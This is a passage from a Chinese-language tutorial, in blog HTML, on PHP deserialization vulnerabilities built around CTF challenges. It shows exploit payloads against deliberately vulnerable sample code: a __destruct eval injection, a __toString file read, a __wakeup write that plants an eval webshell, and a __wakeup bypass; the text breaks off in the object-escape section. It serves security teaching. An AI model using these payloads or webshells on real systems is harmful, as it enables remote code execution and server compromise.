class=\"code\"><pre><span class=\"line\">a - array                    b - boolean  </span><br><span class=\"line\">d - double                   i - integer</span><br><span class=\"line\">o - common object            r - reference</span><br><span class=\"line\">s - string                   C - custom object</span><br><span class=\"line\">O - class                  N - null</span><br><span class=\"line\">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure>\n<h4 id=\"反序列化\"><a class=\"markdownIt-Anchor\" href=\"#反序列化\">#</a> 反序列化</h4>\n<p>反序列化的话，就依次根据规则进行反向复原。</p>\n<p>这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 进行输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $ser = &#x27;O:6:&quot;object&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;team&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;;</span><br><span class=\"line\">    $ser = unserialize($ser);</span><br><span class=\"line\">    echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class=\"line\">    var_dump($ser);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">object(__PHP_Incomplete_Class)#1 (3) &#123;</span><br><span class=\"line\">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;object&quot;</span><br><span class=\"line\">  [&quot;a&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">  [&quot;team&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;hahaha&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用：</h3>\n<p>在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果<strong>让攻击者操纵任意反序列数据</strong>， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。</p>\n<p>挖掘反序列化漏洞的条件是：</p>\n<blockquote>\n<p>1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。</p>\n<p>2. unserialize () 函数的参数可控。</p>\n</blockquote>\n<h4 id=\"0x00-__destruct利用\"><a class=\"markdownIt-Anchor\" href=\"#0x00-__destruct利用\">#</a> 0x00 __destruct () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A&#123;</span><br><span class=\"line\">    var $test = &quot;demo&quot;;</span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        @eval($this-&gt;test);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = $_POST[&#x27;test&#x27;];</span><br><span class=\"line\">$len = strlen($test)+1;</span><br><span class=\"line\">$p = &quot;O:1:\\&quot;A\\&quot;:1:&#123;s:4:\\&quot;test\\&quot;;s:&quot;.$len.&quot;:\\&quot;&quot;.$test.&quot;;\\&quot;;&#125;&quot;; // 构造序列化对象</span><br><span class=\"line\">$test_unser = unserialize($p); // 反序列化同时触发_destruct函数</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&#x27;test&#x27;],复原时还需要有对应的变量值的length</span><br><span class=\"line\">//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">post:</span><br><span class=\"line\">test=phpinfo();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>的值进行覆盖，题目中已经给出了序列化链，很明显是对类</mtext><mi>A</mi><mtext>的</mtext></mrow><annotation encoding=\"application/x-tex\">test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">覆</span><span class=\"mord cjk_fallback\">盖</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">题</span><span class=\"mord cjk_fallback\">目</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">已</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord cjk_fallback\">序</span><span class=\"mord cjk_fallback\">列</span><span class=\"mord cjk_fallback\">化</span><span class=\"mord cjk_fallback\">链</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">很</span><span class=\"mord cjk_fallback\">明</span><span class=\"mord cjk_fallback\">显</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">的</span></span></span></span> test 变量进行覆盖。</p>\n</blockquote>\n<h4 id=\"0x01-__tostring利用\"><a class=\"markdownIt-Anchor\" href=\"#0x01-__tostring利用\">#</a> 0x01 __tostring () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//index.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">$txt = $_GET[&quot;txt&quot;]; </span><br><span class=\"line\">$file = $_GET[&quot;file&quot;]; </span><br><span class=\"line\">$password = $_GET[&quot;password&quot;]; </span><br><span class=\"line\">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    echo &quot;hello friend!&lt;br&gt;&quot;; </span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       echo &quot;不能现在就给你flag哦&quot;; </span><br><span class=\"line\">       exit(); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       include($file); </span><br><span class=\"line\">       $password = unserialize($password); </span><br><span class=\"line\">       echo $password; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">       echo &quot;you are not the number of bugku ! &quot;; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//hint.php</span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Flag&#123;//flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            return (&quot;good&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。</p>\n</blockquote>\n<h4 id=\"0x02-__wakeup利用\"><a class=\"markdownIt-Anchor\" href=\"#0x02-__wakeup利用\">#</a> 0x02 __wakeup () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &#x27;123&#x27;;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $fp = fopen(&quot;flag.php&quot;,&quot;w&quot;);</span><br><span class=\"line\">        fwrite($fp,$this-&gt;test);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">print_r($a);</span><br><span class=\"line\">echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">$a_unser = unserialize($a);</span><br><span class=\"line\">require &quot;flag.php&quot;;</span><br><span class=\"line\">?&gt;     </span><br><span class=\"line\"></span><br><span class=\"line\">pyload:</span><br><span class=\"line\">?id=O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = new test();</span><br><span class=\"line\">echo serialize($test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload</p>\n<p>在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。</p>\n</blockquote>\n<h4 id=\"0x03-__wakeup绕过\"><a class=\"markdownIt-Anchor\" href=\"#0x03-__wakeup绕过\">#</a> 0x03 __wakeup () 绕过</h4>\n<p>极客大挑战 2019 PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">unserialize</span>(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//class.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//其实你这么写也行~</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;admin&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>=<span class=\"number\">100</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p><strong>当成员属性数目大于实际数目时可绕过 wakeup 方法</strong>，其次 private 的 %00 是老生常谈了。多说一句，这是一个 CVE 漏洞</p>\n<h4 id=\"0x04对象逃逸\"><a class=\"markdownIt-Anchor\" href=\"#0x04对象逃逸\">#</a> 0x04 对象逃逸</h4>\n<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。</p>\n<p>对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。</p>\n<ul>\n<li>过滤后字符变多</li>\n<li>过滤后字符变少</li>\n</ul>\n<h5 id=\"过滤后字符变多\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变多\">#</a> 过滤后字符变多</h5>\n<p>设我们先定义一个<strong> user</strong> 类，然后里面一共有 3 个成员变量：<strong>username</strong>、<strong>password</strong>、<strong>isVIP</strong>。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;123456&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br><span class=\"line\"><span 